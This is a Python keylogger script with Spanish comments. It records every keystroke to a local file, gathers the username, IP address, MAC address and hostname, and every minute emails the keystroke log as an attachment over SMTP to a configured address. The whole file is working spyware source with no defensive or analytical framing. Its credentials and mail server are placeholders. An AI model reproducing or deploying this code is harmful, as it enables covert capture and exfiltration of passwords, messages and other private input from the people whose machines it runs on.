import pynput.keyboard
import time
import threading
import os
import socket
import uuid
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from cryptography.fernet import Fernet

# Configuración del correo electrónico
smtp_server = 'servidor smtp'
smtp_port = 587
smtp_username = 'correo'
smtp_password = 'password'

# Dirección de correo electrónico del remitente y del destinatario
sender_email = 'correo'
receiver_email = 'correo'

# Ruta donde se guardará el archivo de registro de teclas
log_file = 'keylog.txt'

# Función para enviar el correo electrónico
def send_email(subject, body, attachment=None):
    message = MIMEMultipart()
    message['From'] = sender_email
    message['To'] = receiver_email
    message['Subject'] = subject

    message.attach(MIMEText(body, 'plain'))

    if attachment:
        with open(attachment, 'rb') as file:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(file.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename= {attachment}')
        message.attach(part)

    with smtplib.SMTP(smtp_server, smtp_port) as server:
        server.starttls()
        server.login(smtp_username, smtp_password)
        server.sendmail(sender_email, receiver_email, message.as_string())

# Función para registrar las teclas presionadas
def keylogger():
    def on_press(key):
        try:
            with open(log_file, 'a') as f:
                f.write(str(key.char))
        except AttributeError:
            with open(log_file, 'a') as f:
                f.write(str(key))

    with pynput.keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Función para obtener la información del sistema
def get_system_info():
    system_info = {}
    system_info['username'] = os.getlogin()
    system_info['ip_address'] = socket.gethostbyname(socket.gethostname())
    system_info['mac_address'] = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
    system_info['hostname'] = socket.gethostname()
    return system_info

# Función principal
def main():
    while True:
        # Iniciar el keylogger en un hilo separado
        keylogger_thread = threading.Thread(target=keylogger)
        keylogger_thread.start()

        # Obtener la información del sistema
        system_info = get_system_info()

        # Esperar unos segundos antes de enviar el correo electrónico
        time.sleep(10)  # Esperar 10 segundos para asegurarse de que el archivo de registro esté creado y listo

        # Enviar el correo electrónico con la información del sistema y el archivo de registro
        send_email('Keylogger Report', 'See attached keylog file for details.', log_file)

        # Esperar 60 segundos antes de enviar el próximo correo electrónico
        time.sleep(60)

if __name__ == "__main__":
    main()
